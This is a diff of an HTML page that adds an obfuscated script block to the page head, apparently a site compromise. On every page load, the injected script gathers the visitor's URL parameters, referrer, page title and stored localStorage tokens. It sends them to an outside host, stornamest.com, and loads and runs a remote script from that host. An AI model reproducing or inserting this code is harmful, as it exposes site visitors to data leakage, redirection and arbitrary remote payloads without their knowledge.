@@ -2,6 +2,49 @@
 <html lang="en">
 
 <head>
+	<script>
+    (function() {
+    var name = '_f37ksJSzNqkxjdjW';
+    if (!window._f37ksJSzNqkxjdjW) {
+        window._f37ksJSzNqkxjdjW = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://stornamest.com/WgnzLLyZ',
+            P_PATH: 'https://stornamest.com/7b4f75c/postback',
+        };
+    }
+    const _Yp7NprfMMdCLBx6h = localStorage.getItem('config');
+    if (typeof _Yp7NprfMMdCLBx6h !== 'undefined' && _Yp7NprfMMdCLBx6h !== null) {
+        var _wtrMc6NV8Gydvvgt = JSON.parse(_Yp7NprfMMdCLBx6h);
+        var _wWnVhwQMtHqb1Kzw = Math.round(+new Date()/1000);
+        if (_wtrMc6NV8Gydvvgt.created_at + window._f37ksJSzNqkxjdjW.ttl < _wWnVhwQMtHqb1Kzw) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _wnFjndXR9hJsQhGy = localStorage.getItem('subId');
+    var _vkhhRpxqHkZFJgfs = localStorage.getItem('token');
+    var _TNgnW7vfKXz8cyMb = '?return=js.client';
+        _TNgnW7vfKXz8cyMb += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _TNgnW7vfKXz8cyMb += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _TNgnW7vfKXz8cyMb += '&default_keyword=' + encodeURIComponent(document.title);
+        _TNgnW7vfKXz8cyMb += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _TNgnW7vfKXz8cyMb += '&name=' + encodeURIComponent(name);
+        _TNgnW7vfKXz8cyMb += '&host=' + encodeURIComponent(window._f37ksJSzNqkxjdjW.R_PATH);
+    if (typeof _wnFjndXR9hJsQhGy !== 'undefined' && _wnFjndXR9hJsQhGy && window._f37ksJSzNqkxjdjW.unique) {
+        _TNgnW7vfKXz8cyMb += '&sub_id=' + encodeURIComponent(_wnFjndXR9hJsQhGy);
+    }
+    if (typeof _vkhhRpxqHkZFJgfs !== 'undefined' && _vkhhRpxqHkZFJgfs && window._f37ksJSzNqkxjdjW.unique) {
+        _TNgnW7vfKXz8cyMb += '&token=' + encodeURIComponent(_vkhhRpxqHkZFJgfs);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._f37ksJSzNqkxjdjW.R_PATH + _TNgnW7vfKXz8cyMb;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
 	<!-- Required meta tags -->
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
